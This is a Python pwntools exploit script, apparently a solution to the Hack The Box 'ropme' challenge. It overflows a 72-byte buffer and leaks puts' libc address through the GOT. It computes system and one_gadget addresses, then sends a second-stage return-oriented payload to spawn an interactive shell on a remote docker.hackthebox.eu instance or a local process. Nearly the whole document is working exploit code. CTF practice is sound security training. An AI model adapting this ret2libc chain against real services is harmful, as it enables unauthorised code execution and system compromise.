from pwn import *
import sys

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

main_func     = 0x400626
puts_plt      = 0x4004e0
fgets_plt     = 0x400500
puts_got      = 0x601018
libc_got      = 0x601020
dynamic       = 0x600e28

# remote libc offsets
puts_offset        = 0x705e0   #0x6f690  #0x705e0
system_libc_offset = 0x435d0   #0x45390  #0x435d0    <--- ROPspector offsets
shell_str_offset   = 0x17f573  #0x18cd56 
pop_rdx            = 0x105145

pop_rdi       = 0x4006d3
pop_rsi_trash = 0x4006d1  #<--pops to rsi and pops to r15 which isn't needed
get_rip       = "A" * 72

def stage1_shellcode():

    payload = get_rip
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
   
    payload += p64(main_func)

    return payload

def stage2_shellcode(system_addr,one_gadget):

    payload = get_rip
    payload += p64(one_gadget)
    return payload

def peda_exploit():
    argv = stage1_shellcode()
    peda.execute("set argv to %s" % argv)
    peda.execute("run")


# ------------------------- connection creation ---------------------------

log.info("Please select an option: [r]emote,[p]rocess,[h]ackthebox")
selection = raw_input("INPUT> ").rstrip()
if selection == 'h':
    port = raw_input("PORT> ")
    p = remote('docker.hackthebox.eu',port)
elif selection == 'g':
    p = gdb.debug('./ropme','b fgets')
elif selection == 'p':
    p =process('./ropme')
elif selection == 'r': 
    p = remote('127.0.0.1','9000')
else:
    log.warning("Invalid selection.")
    sys.exit()

stage1 = stage1_shellcode()

print(stage1)

# ------------------------  stage One ------------------------------------
print(p.recvuntil("dah?"))
p.sendline(stage1)
log.info("Payload deployed..")
leaked_addr = p.recvn(7)

puts_real = leaked_addr[:8].strip().ljust(8,'\x00') 
log.success("Puts() real address  : %x" % u64(puts_real))

libc_real = (u64(puts_real) - puts_offset)
log.info("libc's calculated address  : %x" % libc_real)
system_real = libc_real + system_libc_offset
log.success("system() calculated address: %x" % system_real)
shell_str = libc_real + shell_str_offset 
one_gadget = libc_real + 0x4345e
# ------------------------- stage two --------------------------------------
log.info("Beginning Stage Two")
raw_input("Press [ENTER] to deploy stage two")
stage2 = stage2_shellcode(system_real,one_gadget)
log.info("Shell str location: %x" % shell_str)
print(p.recvline())
log.info("Sending stage two payload....")
print(stage2)
p.sendline(stage2)
p.interactive()

